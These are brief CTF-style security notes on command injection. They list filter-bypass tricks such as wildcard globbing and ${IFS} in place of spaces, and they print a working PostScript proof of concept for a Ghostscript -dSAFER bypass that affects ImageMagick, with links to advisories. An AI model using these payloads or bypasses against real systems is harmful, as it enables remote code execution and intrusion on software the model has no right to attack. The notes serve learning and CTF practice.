# Command injection
In CTF, we can directly cat flag with cmd injection. In real world, we can directly make a reverse shell with it.  
```php
// match one character
cat fla?
cat ./???sword

// match multiple character
cat f*

// bypass the limit on space character
cat${IFS}flag
cat$IFSflag
```

## ghostscript RCE
The sandbox `-dSAFER` of ghostscript has been bypassed! The sandbox is controlled by the `LockSafetyParams` param in the process, then `restore` of gs can overwrite the the param. Many application based on ghostscript would be influenced, such as the most famous application imageMagick. Following is the payload of POC.jpg:  
```php
%!PS
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%id) currentdevice putdeviceprops
```  
Attention ❗️: The timing to trigger the RCE is important.  
[ref: mail of Tavis](http://openwall.com/lists/oss-security/2018/08/21/2)  
[ref: security team of imageMagick](https://imagetragick.com/)  
[ref: PostScript语言安全研究](https://paper.seebug.org/68/#0x03-ghostscriptimagemagick)  
[ref: ImageMagick-CVE-2016-3714](http://www.zerokeeper.com/vul-analysis/ImageMagick-CVE-2016-3714.html)  
[ref: 安全客ghostscript命令执行漏洞预警](https://www.anquanke.com/post/id/157513)
